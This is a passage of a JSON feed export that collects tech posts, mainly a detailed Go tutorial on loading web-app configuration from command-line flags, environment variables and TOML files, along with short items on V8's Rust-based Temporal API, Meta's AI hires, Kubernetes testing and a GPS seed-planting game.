access the cluster without Wireguard VPN</li></ol><p>Are there any benefits or drawbacks from this idea, that I don't see yet?</p><p>Thank you for your ideas!</p>","contentLength":333,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Chromium/V8 implementing Temporal API via Rust (temporal_rs and ICU4X)","url":"https://www.reddit.com/r/rust/comments/1logjzt/chromiumv8_implementing_temporal_api_via_rust/","date":1751311174,"author":"/u/Manishearth","guid":176883,"unread":true,"content":"<p>In the last two months I've been working on adding support for the (rather large) <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Temporal\">Temporal</a> datetime API to V8, Chromium's JS engine. The meat of this implementation is all Rust. </p><p>Firefox already has an implementation using <a href=\"https://github.com/unicode-org/ICU4X\">ICU4X</a>. For V8 we're using <a href=\"https://github.com/boa-dev/temporal\">temporal_rs</a>, which builds on top of ICU4X but does more of the spec-specific stuff. This wouldn't be the first Rust in Chromium, but it's a significant chunk of code! You can see most of the glue code in V8 in <a href=\"https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-temporal-objects.cc\">here</a>, and you can look at all of the CLs <a href=\"https://chromium-review.googlesource.com/q/hashtag:%22temporal%22+(status:open%20OR%20status:merged\">here</a>).</p><p>There's still a bunch of work to do on test conformance, but now is a point where we can at least say it is fully implemented API-wise.</p><p>I'm happy to answer any questions people may have! I'm pretty excited to see this finally happen, it's a long-desired improvement to the JS standard library, and it's cool to see it being done using Rust.</p>","contentLength":844,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Here Is Everyone Mark Zuckerberg Has Hired So Far for Meta's ‘Superintelligence’ Team","url":"https://www.wired.com/story/mark-zuckerberg-welcomes-superintelligence-team/","date":1751307207,"author":"/u/wiredmagazine","guid":176885,"unread":true,"content":"<p> Meta staff today to introduce them to the new superintelligence team. The memo, which WIRED obtained, lists names and bios for the recently hired employees, many of whom came from rival AI firms like OpenAI, Anthropic, and Google.</p><p>Over the past few months, Meta CEO Mark Zuckerberg has been on a recruiting frenzy to poach some of the most sought-after talent in AI. The social media giant has invested $14.3 billion in Scale AI and hired Alexandr Wang, its CEO, to <a data-offer-url=\"https://x.com/alexandr_wang/status/1933328165306577316\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://x.com/alexandr_wang/status/1933328165306577316&quot;}\" href=\"https://x.com/alexandr_wang/status/1933328165306577316\" rel=\"nofollow noopener\" target=\"_blank\">run Meta’s Superintelligence Labs</a>. News of the memo was <a data-offer-url=\"https://www.bloomberg.com/news/articles/2025-06-30/zuckerberg-announces-meta-superintelligence-effort-more-hires\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.bloomberg.com/news/articles/2025-06-30/zuckerberg-announces-meta-superintelligence-effort-more-hires&quot;}\" href=\"https://www.bloomberg.com/news/articles/2025-06-30/zuckerberg-announces-meta-superintelligence-effort-more-hires\" rel=\"nofollow noopener\" target=\"_blank\">first reported by Bloomberg</a>.</p><p>“We’re going to call our overall organization Meta Superintelligence Labs (MSL). This includes all of our foundations, product, and FAIR teams, as well as a new lab focused on developing the next generation of our models,” Zuckerberg wrote in the memo on Monday. Meta declined to comment.</p><p>Zuckerberg introduced Wang, who will be the company’s “chief AI officer” and leader of MSL, as well as former GitHub CEO Nat Friedman. Friedman will colead the new lab with Wang, with a focus on AI products and applied research.</p><p>Here’s the list of all the new hires as seen in Zuckerberg's memo. It notably doesn’t include the employees who joined from OpenAI’s Zurich office.</p><ul><li>Trapit Bansal: pioneered RL on chain of thought and cocreator of o-series models at OpenAl.</li><li>Shuchao Bi: cocreator of GPT-4o voice mode and o4-mini. Previously led multimodal post-training at OpenAl.</li><li>Huiwen Chang: cocreator of GPT-4o's image generation, and previously invented MaskIT and Muse text-to-image architectures at Google Research.</li><li>Ji Lin: helped build 03/o4-mini, GPT-4o, GPT-4.1, GPT-4.5, 40-imagegen, and Operator reasoning stack.</li><li>Joel Pobar: inference at Anthropic. Previously at Meta for 11 years on HHVM, Hack, Flow, Redex, performance tooling, and machine learning.</li><li>Jack Rae: pre-training tech lead for Gemini and reasoning for Gemini 2.5. Led Gopher and Chinchilla early LLM efforts at DeepMind.</li><li>Hongyu Ren: cocreator of GPT-4o, 4o-mini, o1-mini, o3-mini, 03 and o4-mini. Previously leading a group for post-training at OpenAl.</li><li>Johan Schalkwyk: former Google Fellow, early contributor to Sesame, and technical lead for Maya.</li><li>Pei Sun: post-training, coding, and reasoning for Gemini at Google Deepmind. Previously created the last two generations of Waymo's perception models.</li><li>Jiahui Yu: cocreator of 03, 04-mini, GPT-4.1 and GPT-4o. Previously led the perception team at OpenAl, and co-led multimodal at Gemini.</li><li>Shengjia Zhao: cocreator of ChatGPT, GPT-4, all mini models, 4.1 and 03. Previously led synthetic data at OpenAl.</li></ul>","contentLength":2565,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1loeu16/here_is_everyone_mark_zuckerberg_has_hired_so_far/"},{"title":"Test orchestration anyone?","url":"https://www.reddit.com/r/kubernetes/comments/1locgxp/test_orchestration_anyone/","date":1751301898,"author":"/u/Dmitry_Fon","guid":176814,"unread":true,"content":"<p>Almost by implication of Kubernetes, we're having more and more microservices in our software. If you are doing test automation for your application (APIs, End-to-End, Front-End, Back-End, Load testing, etc.) - How are you orchestrating those test? - CI/CD - through Jenkins, GitHub Actions, Argo Workflows? - A dedicated Test orchestration tool?</p>","contentLength":346,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How to manage configuration settings in Go web applications","url":"https://www.alexedwards.net/blog/how-to-manage-configuration-settings-in-go-web-applications","date":1751301728,"author":"/u/alexedwards","guid":176936,"unread":true,"content":"<p>When I'm building a web application in Go, I prefer to use command-line flags to pass configuration settings to the application at runtime. But sometimes, the client I'm working with wants to use environment variables to store configuration settings, or the nature of the project means that storing settings in a TOML, YAML or JSON file is a better fit. And of course that's OK — it makes sense to be flexible and vary how configuration is managed based on the specific needs of a project and/or client.</p><p>So, in this tutorial, I want to share the patterns that I use for parsing configuration settings — whether they come from flags, environment variables or files — and explain how I pass the settings onwards to where they are needed in the rest of the web application code. I'll also end with a short discussion about the relative pros and cons of the different approaches.</p><p>It's a fairly detailed post, so here are the shortcut links for quick reference:</p><p>To illustrate the patterns in the rest of this tutorial, let's pretend that we have a web application where we want to configure the following five settings:</p><table><tbody><tr><td>The port number the web application listens on</td></tr><tr><td>Enables detailed request and error logging</td></tr><tr><td>Maximum duration to wait for a request to complete</td></tr><tr><td>Username required for HTTP Basic Authentication</td></tr><tr><td>Password required for HTTP Basic Authentication</td></tr></tbody></table><p>Regardless of where the configuration settings are coming from (flags, environment variables or a file), I'm quite strict about keeping all the code related to configuration settings isolated in one place, and reading in the configuration setting values <em>right at the start of the program, before doing almost anything else</em>.</p><p>Most of the time, I prefer to store all the configuration setting values in a single  struct, like so:</p><figure><code><pre>type config struct {\n    port           int\n    verboseLogging bool\n    requestTimeout time.Duration\n    basicAuth      struct {\n        username string\n        password string\n    }\n}\n</pre></code></figure><p>I like this because it feels very clear — all the configuration settings are contained in a single struct, along with their appropriate Go type, and you can easily see at a glance what configuration settings the application expects and supports.</p><p>As I mentioned at the start of this tutorial, using command-line flags with the standard library <a href=\"https://pkg.go.dev/flag\"></a> package is my preferred approach to managing configuration settings. With this approach, you explicitly pass the configuration values as part of the command when running the program. For example:</p><figure><code><pre>$ go run main.go -port=9999 -verbose-logging=true -request-timeout=10s -basic-auth-username=admin -basic-auth-password=\"secr3tPa55word\"\n</pre></code></figure><p>In your Go code, you define a specific command-line flag using syntax like this:</p><figure><code><pre>flag.IntVar(&amp;cfg.port, \"port\", 4000, \"The port number the web application listens on\")`\n</pre></code></figure><p>In this example code, we define a command-line flag named  that accepts an integer value and stores it at the location pointed to by the  pointer. It will have a default value of  if no corresponding  flag is provided when starting the application, and the final parameter is a description that will be displayed when a user runs the program with the  flag.</p><p>Importantly, after you've defined all the command-line flags for your application, you need to call the <a href=\"https://pkg.go.dev/flag#Parse\"></a> function to actually read in the values from the command-line arguments.</p><p>Let's put this together in a very simple application that reads the command-line flag values into a  struct, and then prints them out.</p><figure><code><pre>package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"time\"\n)\n\n// The config struct holds all configuration settings for the application.\ntype config struct {\n    port           int\n    verboseLogging bool\n    requestTimeout time.Duration\n    basicAuth      struct {\n        username string\n        password string\n    }\n}\n\nfunc main() {\n    // Create a new config instance.\n    var cfg config\n\n    // Define the command-line flags. Notice that we define these so that the values \n    // are read directly into the appropriate config struct field, and set sensible default \n    // values for each of them.\n    flag.IntVar(&amp;cfg.port, \"port\", 4000, \"The port number the web application listens on\")\n    flag.BoolVar(&amp;cfg.verboseLogging, \"verbose-logging\", false, \"Enables detailed request and error logging\")\n    flag.DurationVar(&amp;cfg.requestTimeout, \"request-timeout\", 5*time.Second, \"Maximum duration to wait for a request to complete\")\n    flag.StringVar(&amp;cfg.basicAuth.username, \"basic-auth-username\", \"\", \"Username required for HTTP Basic Authentication\")\n    flag.StringVar(&amp;cfg.basicAuth.password, \"basic-auth-password\", \"\", \"Password required for HTTP Basic Authentication\")\n\n    // Parse the flags with the flag.Parse function. This is important!\n    flag.Parse()\n\n    // Print all configuration settings.\n    fmt.Printf(\"Port: %d\\n\", cfg.port)\n    fmt.Printf(\"Verbose Logging: %t\\n\", cfg.verboseLogging)\n    fmt.Printf(\"Request Timeout: %v\\n\", cfg.requestTimeout)\n    fmt.Printf(\"Basic Auth Username: %s\\n\", cfg.basicAuth.username)\n    fmt.Printf(\"Basic Auth Password: %s\\n\", cfg.basicAuth.password)\n}\n</pre></code></figure><p>If you're following along, go ahead and run the application with your own values in the command-line flags. You should see the same values printed out by the application, like so:</p><figure><code><pre>$ go run main.go -port=9999 -verbose-logging=true -request-timeout=30s -basic-auth-username=admin -basic-auth-password=\"secr3tPa55word\"\n<samp>Port: 9999\nVerbose Logging: true\nRequest Timeout: 30s\nBasic Auth Username: admin\nBasic Auth Password: secr3tPa55word</samp></pre></code></figure><p>If you don't provide a value for a specific flag, the application will revert to using the default value you specified. For example, if you don't provide a  flag it will default to the value of , like so:</p><figure><code><pre>$ go run main.go -basic-auth-username=admin -basic-auth-password=\"secr3tPa55word\"\n<samp>Port: 4000\nVerbose Logging: false\nRequest Timeout: 5s\nBasic Auth Username: admin\nBasic Auth Password: secr3tPa55word</samp></pre></code></figure><p>One of the great things about the standard library  package is the support for automatic help text. If you run your application with the flag , it will list all the available flags for the application, along with their accompanying help text and default values if appropriate. Like so:</p><figure><code><pre>$ go run main.go -help\n<samp>Usage of /tmp/go-build2103583960/b001/exe/main:\n  -basic-auth-password string\n        Password required for HTTP Basic Authentication\n  -basic-auth-username string\n        Username required for HTTP Basic Authentication\n  -port int\n        The port number the web application listens on (default 4000)\n  -request-timeout duration\n        Maximum duration to wait for a request to complete (default 5s)\n  -verbose-logging\n        Enables detailed request and error logging</samp></pre></code></figure><p>For boolean flags, if you want to pass a value of  you can simply include the flag name without assigning a value. The following two commands are equivalent:</p><figure><code><pre>$ go run main.go -verbose-logging=true\n$ go run main.go -verbose-logging\n</pre></code></figure><p>In contrast, you always need to use  if you want to set a boolean flag value to .</p><p>You can use one or two dashes in front of a flag name, both work identically. The standard library  package does not support 'short' flags, and the number of dashes has no effect on the behavior or any special meaning. So it's just a matter of personal taste which you use. The following two commands are equivalent:</p><figure><code><pre>$ go run main.go -verbose-logging -request-timeout=30s\n$ go run main.go --verbose-logging --request-timeout=30s\n</pre></code></figure><p>If you try to pass an invalid value as a command-line flag, the application will automatically exit with an error message and the help text for reference. For example, if you try to pass a non-integer value in the  flag, the parsing would fail and the output would look like this:</p><figure><code><pre>$ go run main.go -port=foobar\n<samp>invalid value \"foobar\" for flag -port: parse error\nUsage of /tmp/go-build2103583960/b001/exe/main:\n  -basic-auth-password string\n        Password required for HTTP Basic Authentication\n  -basic-auth-username string\n        Username required for HTTP Basic Authentication\n  -port int\n        The port number the web application listens on (default 4000)\n  -request-timeout duration\n        Maximum duration to wait for a request to complete (default 5s)\n  -verbose-logging\n        Enables detailed request and error logging\nexit status 2</samp></pre></code></figure><p>Similarly, if you try to use a flag that as not been defined, the application will automatically exit with an error message and the help text. For example:</p><figure><code><pre>$ go run main.go -foobar=baz\n<samp>flag provided but not defined: -foobar\n...etc</samp></pre></code></figure><p>The  package provides functions for reading command-line flag values into the following Go types: , , , , , ,  and .</p><p>If you want to parse a command-line flag value into another Go type (such as  or ), you have a few different options. The simplest approach is to use the   function, which I've written about <a href=\"https://www.alexedwards.net/blog/custom-command-line-flags\">here</a>. Or you can also make your own custom type that implements the  or  interfaces, and define the flag using either the  or  functions respectively. I've shared a gist demonstrating how to do this <a href=\"https://gist.github.com/alexedwards/7838faf5f4936e2024657d6e306723e1\">here</a>.</p><p>Alternatively, there are third-party packages (such as <a href=\"https://github.com/spf13/viper\"></a>) that you can use, which automatically support parsing command-line flags into a wider range of Go types. Personally, I've never felt it necessary to use these, but YMMV.</p><p>Lastly, if you want you can create , which act like a 'container' for a distinct set of command-line flags. It's rare that I need to use flagsets in a web application, but I do often use them when building CLI applications with multiple subcommands. There's a good tutorial about how to use flagsets <a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-the-flag-package-in-go#using-flagset-to-implement-sub-commands\">here</a>.</p><h2>Using environment variables</h2><p>First, I'll start by saying that you can use environment variables in conjunction with command-line flags if you want. Simply set your environment variables as normal, and use them in the command when starting your application. Like so:</p><figure><code><pre>$ export VERBOSE_LOGGING=\"true\"\n$ export REQUEST_TIMEOUT=\"30s\"\n$ go run main.go -verbose-logging=$VERBOSE_LOGGING -request-timeout=$REQUEST_TIMEOUT\n</pre></code></figure><p>But if you don't want to do this, you can read the values from environment variables directly into your Go code using the <a href=\"https://pkg.go.dev/os#Getenv\"></a> function. This will return the value of the environment variable as a , or the empty string  if the environment variable doesn't exist. You can also use the <a href=\"https://pkg.go.dev/os#LookupEnv\"></a> function to check whether a specific environment variable exists or not.</p><p>To help read values from environment variables, I like to create an  package containing some helper functions that convert the environment variable  to the appropriate Go type, and optionally set a default value for if the environment variable doesn't exist (just like command-line flags). For example:</p><figure><figcaption>File: internal/env/env.go</figcaption><code><pre>package env\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"strconv\"\n    \"time\"\n)\n\nfunc GetInt(key string, defaultValue int) int {\n    value, exists := os.LookupEnv(key)\n    if !exists {\n        return defaultValue\n    }\n\n    intValue, err := strconv.Atoi(value)\n    if err != nil {\n        panic(fmt.Errorf(\"environment variable %s=%q cannot be converted to an int\", key, value))\n    }\n    return intValue\n}\n\nfunc GetBool(key string, defaultValue bool) bool {\n    value, exists := os.LookupEnv(key)\n    if !exists {\n        return defaultValue\n    }\n\n    boolValue, err := strconv.ParseBool(value)\n    if err != nil {\n        panic(fmt.Errorf(\"environment variable %s=%q cannot be converted to a bool\", key, value))\n    }\n    return boolValue\n}\n\nfunc GetDuration(key string, defaultValue time.Duration) time.Duration {\n    value, exists := os.LookupEnv(key)\n    if !exists {\n        return defaultValue\n    }\n\n    durationValue, err := time.ParseDuration(value)\n    if err != nil {\n        panic(fmt.Errorf(\"environment variable %s=%q cannot be converted to a time.Duration\", key, value))\n    }\n    return durationValue\n}\n\nfunc GetString(key string, defaultValue string) string {\n    value, exists := os.LookupEnv(key)\n    if !exists {\n        return defaultValue\n    }\n    return value\n}\n</pre></code></figure><p>In some projects, I use a twist on these helper functions and panic if a specific environment variable isn't set, rather than returning a default value. For example:</p><figure><code><pre>func MustGetInt(key string) int {\n    value, exists := os.LookupEnv(key)\n    if !exists {\n        panic(fmt.Errorf(\"environment variable %s must be set\", key))\n    }\n\n    intValue, err := strconv.Atoi(value)\n    if err != nil {\n        panic(fmt.Errorf(\"environment variable %s=%q cannot be converted to an int\", key, value))\n    }\n    return intValue\n}\n</pre></code></figure><p>Using those helper functions in your application then looks a bit like this:</p><figure><code><pre>package main\n\nimport (\n    \"fmt\"\n    \"time\"\n\n    \"your-project/internal/env\"\n)\n\ntype config struct {\n    port           int\n    verboseLogging bool\n    requestTimeout time.Duration\n    basicAuth      struct {\n        username string\n        password string\n    }\n}\n\nfunc main() {\n    var cfg config\n\n    cfg.port = env.GetInt(\"PORT\", 4000)\n    cfg.verboseLogging = env.GetBool(\"VERBOSE_LOGGING\", false)\n    cfg.requestTimeout = env.GetDuration(\"REQUEST_TIMEOUT\", 5*time.Second)\n    cfg.basicAuth.username = env.GetString(\"BASIC_AUTH_USERNAME\", \"\")\n    cfg.basicAuth.password = env.GetString(\"BASIC_AUTH_PASSWORD\", \"\")\n\n    fmt.Printf(\"Port: %d\\n\", cfg.port)\n    fmt.Printf(\"Verbose Logging: %t\\n\", cfg.verboseLogging)\n    fmt.Printf(\"Request Timeout: %v\\n\", cfg.requestTimeout)\n    fmt.Printf(\"Basic Auth Username: %s\\n\", cfg.basicAuth.username)\n    fmt.Printf(\"Basic Auth Password: %s\\n\", cfg.basicAuth.password)\n}\n</pre></code></figure><p>If you'd like to try this out, go ahead and add the necessary environment variables to your  or  files, or  them in your shell, and try running the application again. You should see the configuration settings reflected in the output, or any default values for ones that you didn't set.</p><figure><code><pre>$ export PORT=\"9999\"\n$ export VERBOSE_LOGGING=\"false\"\n$ export BASIC_AUTH_USERNAME=\"admin\"\n$ export BASIC_AUTH_PASSWORD=\"secr3tPa55word\"\n$ go run main.go \n<samp>Port: 9999\nVerbose Logging: false\nRequest Timeout: 5s\nBasic Auth Username: admin\nBasic Auth Password: secr3tPa55word</samp></pre></code></figure><p>If you're working on multiple projects on the same development machine (and not using separate containers for each project), it can become awkward to manage environment variables and avoid clashes across the projects. Rather than setting environment variables in  or , a fairly common workaround is to create an  file in your project containing the environment variables, like so:</p><figure><code><pre>export PORT=5000\nexport VERBOSE_LOGGING=true\nexport REQUEST_TIMEOUT=10s\nexport BASIC_AUTH_USERNAME=admin\nexport BASIC_AUTH_PASSWORD=secr3tPa55word\n</pre></code></figure><p>Then you can  the  file to export the variables in the current terminal session and run your Go application:</p><figure><code><pre>$ source .env \n$ go run main.go \n<samp>Port: 5000\nVerbose Logging: true\nRequest Timeout: 10s\nBasic Auth Username: admin\nBasic Auth Password: secr3tPa55word</samp></pre></code></figure><p>Alternatively, if you don't want to keep running the  command, you can use the <a href=\"https://github.com/joho/godotenv\"></a> package to automatically load the values from the  file into the environment when your application starts up.</p><h2>Using configuration files</h2><p>The third option that I sometimes use is configuration files, which store all the settings in a single file on-disk. I normally only use these in projects where there are  of configuration settings, and loading them all via command-line flags would be onerous and error-prone. Or also, if the configuration settings are complex, with a deeply nested 'structure' to them.</p><p>There are a lot of different formats that you can use for configuration files, such as TOML or YAML — or even JSON. They all have different advantages and disadvantages, and you'll be hard-pressed to find one that everybody agrees is 'perfect'. But whatever format you choose, there is probably a Go package that you can use to automatically parse values from the file into a  struct for you.</p><p>For example, let's say that you want to use TOML and have a configuration file that looks like this:</p><figure><code><pre># Server configuration\nport = 4000\nverbose_logging = true\nrequest_timeout = \"10s\"\n\n# Basic authentication settings\n[basic_auth]\nusername = \"admin\"\npassword = \"secr3tPa55word\"\n</pre></code></figure><p>You can use the <a href=\"https://github.com/BurntSushi/toml\"></a> package to read the file and unpack the contents to a  struct like so:</p><figure><code><pre>package main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"time\"\n\n    \"github.com/BurntSushi/toml\"\n)\n\n// Make sure the struct fields are exported, so that the BurntSushi/toml package\n// can write to them, and use struct tags to map the TOML key/value pairs to the\n// appropriate struct field.\ntype config struct {\n    Port           int           `toml:\"port\"`\n    VerboseLogging bool          `toml:\"verbose_logging\"`\n    RequestTimeout time.Duration `toml:\"request_timeout\"`\n    BasicAuth      struct {\n        Username string `toml:\"username\"`\n        Password string `toml:\"password\"`\n    } `toml:\"basic_auth\"`\n}\n\nfunc main() {\n    var cfg config\n\n    // Load configuration settings from the config.toml file.\n    metadata, err := toml.DecodeFile(\"config.toml\", &amp;cfg)\n    if err != nil {\n        log.Fatalf(\"error loading configuration: %v\", err)\n    }\n\n    // Check for any undecoded keys in the config.toml file.\n    if len(metadata.Undecoded()) &gt; 0 {\n        log.Fatalf(\"unknown configuration keys: %v\", metadata.Undecoded())\n    }\n\n    fmt.Printf(\"Port: %d\\n\", cfg.Port)\n    fmt.Printf(\"Verbose Logging: %t\\n\", cfg.VerboseLogging)\n    fmt.Printf(\"Request Timeout: %v\\n\", cfg.RequestTimeout)\n    fmt.Printf(\"Basic Auth Username: %s\\n\", cfg.BasicAuth.Username)\n    fmt.Printf(\"Basic Auth Password: %s\\n\", cfg.BasicAuth.Password)\n}\n</pre></code></figure><p>Notice that in this code we're making use of the metadata returned by the  function to check if any settings were not decoded successfully — which should help to catch typos or invalid keys in the TOML file.</p><h2>Passing settings to where they are needed</h2><p>Getting the configuration settings into the  struct, wherever they come from, is the first half of the puzzle. The second part is getting those settings to where you need them in your Go code. There are many different ways to approach this, and no single 'right' way. </p><p>For small or medium sized web applications, I often use a pattern of creating an  struct which contains all the dependencies that my HTTP handlers need, and I implement the handlers as methods on the  struct. To make the configuration settings available to the HTTP handlers, I simply include the  struct as a field in . </p><figure><code><pre>package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"log/slog\"\n    \"net/http\"\n    \"os\"\n    \"time\"\n)\n\ntype config struct {\n    port           int\n    verboseLogging bool\n    requestTimeout time.Duration\n    basicAuth      struct {\n        username string\n        password string\n    }\n}\n\n// The application struct contains the dependencies for the handlers, including \n// the config struct\ntype application struct {\n    config config\n    logger *slog.Logger\n}\n\nfunc main() {\n    logger := slog.New(slog.NewTextHandler(os.Stdout, nil))\n\n    var cfg config\n    flag.IntVar(&amp;cfg.port, \"port\", 4000, \"The port number the web application listens on\")\n    flag.BoolVar(&amp;cfg.verboseLogging, \"verbose-logging\", false, \"Enables detailed request and error logging\")\n    flag.DurationVar(&amp;cfg.requestTimeout, \"request-timeout\", 5*time.Second, \"Maximum duration to wait for a request to complete\")\n    flag.StringVar(&amp;cfg.basicAuth.username, \"basic-auth-username\", \"\", \"Username required for HTTP Basic Authentication\")\n    flag.StringVar(&amp;cfg.basicAuth.password, \"basic-auth-password\", \"\", \"Password required for HTTP Basic Authentication\")\n    flag.Parse()\n\n    app := &amp;application{\n        config: cfg,\n        logger: logger,\n    }\n\n    mux := http.NewServeMux()\n    mux.HandleFunc(\"/\", app.home)\n\n    // Use the port configuration setting\n    logger.Info(\"starting server\", \"port\", cfg.port)\n\n    err := http.ListenAndServe(fmt.Sprintf(\":%d\", cfg.port), mux)\n    if err != nil {\n        logger.Error(err.Error())\n        os.Exit(1)\n    }\n}\n\nfunc (app *application) home(w http.ResponseWriter, r *http.Request) {\n    // Use the verboseLogging configuration setting\n    if app.config.verboseLogging {\n        app.logger.Info(\"handling request\", \"method\", r.Method, \"path\", r.URL.Path)\n    }\n\n    fmt.Fprintf(w, \"Hello!\")\n}\n</pre></code></figure><p>If you run this application with the  flag, and make a HTTP request to , you should see the details of the request in the log output, similar to below — demonstrating that the config setting is correctly available to the handler.</p><figure><code><pre>$ go run main.go -verbose-logging\n<samp>time=2025-06-27T14:15:40.230+02:00 level=INFO msg=\"starting server\" port=4000\ntime=2025-06-27T14:15:48.705+02:00 level=INFO msg=\"handling request\" method=GET path=/</samp></pre></code></figure><p>In larger applications where I want to define my handlers outside of , or pass the config struct to functions in other packages, I normally define an exported  struct in an  package, and pass this around as necessary. For example, let's say that you have a project structure like so:</p><figure><code><pre>├── go.mod\n├── go.sum\n├── main.go\n└── internal\n    ├── config\n    │   └── config.go\n    └── handlers\n        └── home.go\n</pre></code></figure><p>Then the contents of those  files would look something like this:</p><figure><figcaption>File: internal/config/config.go</figcaption><code><pre> \npackage config\n\nimport \"time\"\n\ntype Config struct {\n    Port           int\n    VerboseLogging bool\n    RequestTimeout time.Duration\n    BasicAuth      struct {\n        Username string\n        Password string\n    }\n}\n</pre></code></figure><figure><figcaption>File: internal/handlers/home.go</figcaption><code><pre>package handlers\n\nimport (\n    \"fmt\"\n    \"log/slog\"\n    \"net/http\"\n\n    \"your-project/internal/config\"\n)\n\nfunc Home(cfg config.Config, logger *slog.Logger) http.HandlerFunc {\n    return func(w http.ResponseWriter, r *http.Request) {\n        if cfg.VerboseLogging {\n            logger.Info(\"handling request\", \"method\", r.Method, \"path\", r.URL.Path)\n        }\n\n        fmt.Fprintf(w, \"Hello!\")\n    }\n}\n</pre></code></figure><figure><code><pre>package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"log/slog\"\n    \"net/http\"\n    \"os\"\n    \"time\"\n\n    \"your-project/internal/config\"\n    \"your-project/internal/handlers\"\n)\n\nfunc main() {\n    logger := slog.New(slog.NewTextHandler(os.Stdout, nil))\n\n    var cfg config.Config\n    flag.IntVar(&amp;cfg.Port, \"port\", 4000, \"The port number the web application listens on\")\n    flag.BoolVar(&amp;cfg.VerboseLogging, \"verbose-logging\", false, \"Enables detailed request and error logging\")\n    flag.DurationVar(&amp;cfg.RequestTimeout, \"request-timeout\", 5*time.Second, \"Maximum duration to wait for a request to complete\")\n    flag.StringVar(&amp;cfg.BasicAuth.Username, \"basic-auth-username\", \"\", \"Username required for HTTP Basic Authentication\")\n    flag.StringVar(&amp;cfg.BasicAuth.Password, \"basic-auth-password\", \"\", \"Password required for HTTP Basic Authentication\")\n    flag.Parse()\n\n    mux := http.NewServeMux()\n    mux.HandleFunc(\"/\", handlers.Home(cfg, logger))\n\n    // Use the port configuration setting\n    logger.Info(\"starting server\", \"port\", cfg.Port)\n\n    err := http.ListenAndServe(fmt.Sprintf(\":%d\", cfg.Port), mux)\n    if err != nil {\n        logger.Error(err.Error())\n        os.Exit(1)\n    }\n}\n</pre></code></figure><p>Obviously I'm using command-line flags in these examples, but the same patterns work for environment variables or config files too — once the  struct is loaded with the data, it doesn't matter where it originally came from and the code patterns are the same.</p><p>If you've been in the web development world for a long time and buy into the <a href=\"https://12factor.net/config\">12-factor app principles</a> (which I generally do), you might think that the correct approach is <em>\"just use environment variables\"</em>. But over the years I've come to the conclusion that they have some drawbacks:</p><ul><li>I've been bitten more times than I want by bugs that were ultimately a result of an unset or unexpected value in an environment variable — and I think that part of the problem here is that environment variables aren't <em>readily and easily observable</em> in the same way that the values in command-line flags or a configuration file are. </li><li>If you're working on multiple projects on the same development machine (rather than working in separate containers for each project), you have to manage the lack of natural isolation between environment variables... you need to make sure that there aren't any naming clashes, and that (for example) application A isn't accidentally using the  setting intended for application B.</li><li>I've also seen a lot of Go codebases where configuration settings are read in using <em>at the point in the code where they are needed</em>. This makes discoverability difficult — it's hard to look at an application's code and easily see <em>what the expected configuration settings are</em>. </li></ul><p>You can mitigate these issues with some of the techniques that we've discussed in this tutorial. If you're strict about reading all the settings into a single  struct at application startup, that addresses the discoverability problem. If you create helpers like  which panic if an environment variable isn't set, that helps to eliminate bugs that exist due to missing environment variables. And you can work around some of the environment variable isolation problems in development by using a  file — but at that point, it might be worth considering whether a configuration file might be more appropriate.</p><p>One of the big reasons that I like to use command-line flags is that you get a lot of stuff for free. You get automatic  text, automatic type conversions, the ability to set defaults, and it handles invalid inputs and undefined flags nicely. Also, it's always very clear what configuration values are being used — you either explicitly pass the values when starting the application, or the default values hardcoded into your Go codebase are used. On top of that, most other gophers will be familiar with the  package and you don't need any third-party dependencies.</p><p>When I'm using command-line flags, I typically set the default values to things that are appropriate for a development environment. This is mainly so I don't have to keep typing long commands to run the application when actively developing it.</p><p>In terms of application secrets, like I <a href=\"https://www.alexedwards.net/blog/how-to-manage-configuration-settings-in-go-web-applications#using-environment-variables\">mentioned earlier</a>, there's nothing stopping you from storing a specific secret in an environment variable and using it in conjunction with a command-line flag if you want. For example, if you store a password for your database user in a  environment variable, you can include it as a command-line flag value when starting the application like so:</p><figure><code><pre>$ go run main.go -db-user=web -db-password=$DB_PASSWORD\n</pre></code></figure><p>Or, although it is a bit more 'magical', you could even use the environment variable as the default value:</p><figure><code><pre>flag.StringVar(&amp;cfg.db.password, \"db-password\", os.Getenv(\"DB_PASSWORD\"), \"Database user password\")\n</pre></code></figure><p>So, for all these reasons, I tend to prefer using command-line flags for configuration. The big exception to this is when there are  of configuration settings, and it would be awkward to pass them all via command-line flags, or the settings have a deeply nested 'structure' to them. In these cases, I think it can be more practical and maintainable to store the settings in a TOML or JSON configuration file, and load them on application startup like we demonstrated earlier.</p>","contentLength":26965,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1loceah/how_to_manage_configuration_settings_in_go_web/"},{"title":"Built a geospatial game in Go using PostGIS where you plant seeds at real locations","url":"https://www.reddit.com/r/golang/comments/1loboyo/built_a_geospatial_game_in_go_using_postgis_where/","date":1751300091,"author":"/u/SoaringSignificant","guid":176781,"unread":true,"content":"<p>So I built this thing where you plant virtual seeds at real GPS locations and have to go back to water them or they die. Sounds dumb but I had fun making it and it's kinda fun to use.</p><p>Like you plant a seed at your gym, and if you don't go back within a few days your plant starts losing health. I've got a bunch of plants that I'm trying to get to level 10.</p><p>Built the main logic in Go, TypeScript + React for the frontend, and PostgreSQL with PostGIS for all the geospatial queries, though a bunch of that stuff happens in the service layer too. The geospatial stuff was interesting to work out, I ended up implementing plants and soils as circles since it makes the overlap detection and containment math way simpler. Figuring out when a plant fits inside a soil area or when two plants would overlap becomes basic circle geometry instead of dealing with complex polygons.</p><p>Plants decay every 4 hours unless you water them recently (there's a grace period system). Got a bunch of other mechanics like different soil types and plant tempers that are not fully integrated into the project right now. Just wanted to get the core loop working first and see how people actually use it.</p><p>You 